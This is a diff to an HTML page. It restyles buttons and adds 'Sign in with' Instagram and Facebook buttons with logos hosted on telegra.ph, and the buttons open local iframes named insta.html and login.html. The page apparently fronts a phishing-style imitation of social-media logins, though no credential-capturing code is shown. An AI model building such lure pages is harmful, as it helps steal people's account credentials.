@@ -4,6 +4,7 @@
     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
     <meta name="" content="">
     <title></title>
+       <link rel="stylesheet" href="stile.css" type="text/css" media="all" />
     <style type="text/css" media="all">
     body h1,body h2 {
       text-align: center;
@@ -156,7 +157,7 @@
     }
 
     100% {
-      transform: translateY(-230vh) rotate(600deg);
+      transform: translateY(-330vh) rotate(600deg);
     }
   }
 
@@ -166,18 +167,11 @@
     }
 
     100% {
-      transform: translateY(-230vh) rotate(600deg);
+      transform: translateY(-330vh) rotate(600deg);
     }
   }
-       #boton3 {
-         z-index: 999;
-         position: relative;
-         left: 10vw;
-         top: 7vh;
-         width: 20vw;
-         font-size: 5vw;
-       }
-       #boton2 {
+       
+        #boton2 {
          z-index: 100001;
          position: absolute;
          left: 86.5vw;
@@ -188,15 +182,7 @@
          width: 5vw;
          font-size: 5vw;
        }
-       #boton4 {
-         z-index: 999;
-         position: relative;
-         left: 40vw;
-         top: 7vh;
-         width: 20vw;
-         font-size: 5vw;
-       }
-       #boton5 {
+          #boton5 {
          z-index: 1000001;
          position: absolute;
          left: 86.5vw;
@@ -212,7 +198,6 @@
          width: 80vw;
          height: 515px;
          position: absolute;
-         z-index: 1000;
          left: 10vw;
          top: 10vh;
          filter: blur(0);
@@ -287,8 +272,41 @@
             margin-bottom: 2vh;
             font-size: 3vw;
           }
-         
-
+          .sign {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-content: center;
+          }
+           #boton3 {
+         z-index: 999;
+         position: relative;
+         left: 4vw;
+         width: 25vw;
+         font-size: 5vw;
+       }
+        #boton3, #boton4 {
+          border-style: none;
+          top: 17vh;
+        }
+       #boton4 {
+         z-index: 999;
+         position: relative;
+         left: 23vw;
+         width: 25vw;
+         font-size: 5vw;
+       }
+       .resa {
+         width:7vw ;
+         position: relative;
+         left: 20vw;
+         top: 13vh;
+         z-index: 1000;
+       }
+        .prui {
+          left: 40vw;
+        }
+        
     </style>
   </head>
   <body>
@@ -368,15 +386,18 @@
        <div class="mery">
          .
        </div>
+       <img class="resa pruo" src="https://telegra.ph/file/b3e874f6243a801780ec2.png" alt="" />
         <button id="boton3" type="button" onclick="ocultar()">Instagram</button>
-
-    <button id="boton2" type="button" onclick="mostrar()">x</button>
-
-    <button id="boton4" type="button" onclick="ocultare()">Facebook</button>
+        <img class="resa prui" src="https://telegra.ph/file/1d205b93ae81198fea2f1.png" alt="" />
+           <button id="boton4" type="button" onclick="ocultare()">Facebook</button>
+           
+           <div class="sign">
+  <h2>
+    Sign in with
+  </h2>
   </div>
-      <button id="boton5" type="button" onclick="mostrare()">x</button>
-    </div>
-     
+</div>
+   
     <div id="obj1">
       <iframe src="insta.html" frameborder="0" sandbox="allow-forms"></iframe>
     </div>
@@ -384,6 +405,11 @@
       <div id="obj2">
         <iframe class="ifr" src="login.html" frameborder="0" sandbox="allow-forms"></iframe>
       </div>
+
+     <button id="boton2" type="button" onclick="mostrar()">x</button>
+      <button id="boton5" type="button" onclick="mostrare()">x</button>
+     
+
     <script>
         function ocultar(){
 document.getElementById('obj1').style.display = 'block';
@@ -394,7 +420,7 @@ document.getElementById('boy').style.filter = 'blur(4px)';
 function mostrar(){
 document.getElementById('obj1').style.display = 'none';
 document.getElementById('boton2').style.display = 'none';
-document.getElementById('boton3').style.display = 'block';
+document.getElementById('boton3').style.display = 'in-line';
 document.getElementById('boy').style.filter = 'blur(0)';
 }
 function ocultare(){
@@ -406,7 +432,7 @@ document.getElementById('boy').style.filter = 'blur(4px)';
 function mostrare(){
 document.getElementById('obj2').style.display = 'none';
 document.getElementById('boton5').style.display = 'none';
-document.getElementById('boton4').style.display = 'block';
+document.getElementById('boton4').style.display = 'in-line';
 document.getElementById('boy').style.filter = 'blur(0)';
 }
     </script>
